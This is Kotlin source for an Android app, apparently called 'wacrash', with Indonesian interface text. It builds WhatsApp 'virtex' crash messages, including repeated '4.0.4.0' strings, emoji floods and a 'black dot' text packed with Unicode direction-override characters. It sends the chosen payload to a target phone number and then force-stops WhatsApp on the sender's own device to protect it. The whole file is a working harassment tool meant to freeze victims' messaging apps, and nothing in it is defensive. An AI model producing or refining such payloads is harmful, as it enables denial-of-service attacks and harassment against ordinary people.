package com.wacrash

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.ArrayAdapter
import android.widget.Button
import android.widget.EditText
import android.widget.Spinner
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private lateinit var etNumber: EditText
    private lateinit var spinnerPayload: Spinner
    private lateinit var btnSend: Button
    private lateinit var tvStatus: TextView

    private val payloads by lazy {
        mapOf(
            "Virtex 4.0.4.0" to build4040(),
            "Virtex Emoji 4500" to buildEmojiFlood(4500),
            "Virtex Black Dot" to buildBlackDot(),
            "Virtex Mixed Heavy" to buildMixed(),
            "Virtex Classic Full" to buildVirtexClassic()
        )
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        etNumber = findViewById(R.id.etNumber)
        spinnerPayload = findViewById(R.id.spinnerPayload)
        btnSend = findViewById(R.id.btnSend)
        tvStatus = findViewById(R.id.tvStatus)

        val adapter = ArrayAdapter(
            this,
            android.R.layout.simple_spinner_dropdown_item,
            payloads.keys.toList()
        )
        spinnerPayload.adapter = adapter

        btnSend.setOnClickListener {
            val number = etNumber.text.toString().trim()
                .replace("+", "")
                .replace(" ", "")
                .replace("-", "")

            if (number.length < 10) {
                Toast.makeText(this, "nomor kurang lengkap", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            val selected = spinnerPayload.selectedItem.toString()
            val payload = payloads[selected] ?: return@setOnClickListener

            sendCrash(number, payload)
        }
    }

    private fun sendCrash(number: String, payload: String) {
        tvStatus.text = "mengirim virtex..."

        val url = "https://api.whatsapp.com/send?phone=$number&text=${Uri.encode(payload)}"
        val intent = Intent(Intent.ACTION_VIEW).apply {
            data = Uri.parse(url)
            setPackage("com.whatsapp")
        }

        if (intent.resolveActivity(packageManager) == null) {
            intent.setPackage("com.whatsapp.w4b")
        }

        if (intent.resolveActivity(packageManager) == null) {
            tvStatus.text = "WhatsApp tidak ditemukan"
            Toast.makeText(this, "install WhatsApp dulu", Toast.LENGTH_SHORT).show()
            return
        }

        startActivity(intent)

        Handler(Looper.getMainLooper()).postDelayed({
            forceStopWhatsApp()
            tvStatus.text = "virtex terkirim + proteksi aktif"
            Toast.makeText(this, "payload terkirim", Toast.LENGTH_SHORT).show()
        }, 1500)
    }

    private fun forceStopWhatsApp() {
        try {
            Runtime.getRuntime().exec("am force-stop com.whatsapp")
            Runtime.getRuntime().exec("am force-stop com.whatsapp.w4b")
        } catch (e: Exception) {
            try {
                val launch = packageManager.getLaunchIntentForPackage("com.whatsapp")
                launch?.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(launch)
            } catch (_: Exception) {}
        }
    }

    private fun build4040(): String {
        val base = "4.0.4.0"
        return (base + ".").repeat(250).dropLast(1)
    }

    private fun buildEmojiFlood(count: Int): String {
        val emojis = listOf("😂", "🔥", "💀", "☠️", "🖤", "💣")
        val sb = StringBuilder()
        repeat(count) {
            sb.append(emojis[it % emojis.size])
        }
        return sb.toString()
    }

    private fun buildBlackDot(): String {
        val rtl = "\u202E"
        val ltr = "\u202D"
        val pop = "\u202C"
        val black = "⚫"
        val junk = (rtl + ltr + pop).repeat(600)
        return "$black$junk sentuh titik hitam ini $junk$black"
    }

    private fun buildMixed(): String {
        return build4040().take(1200) +
                "\n\n" +
                buildEmojiFlood(2000) +
                "\n\n" +
                buildBlackDot()
    }

    private fun buildVirtexClassic(): String {
        val base = "4.0.4.0."
        return base.repeat(800).dropLast(1)
    }
}
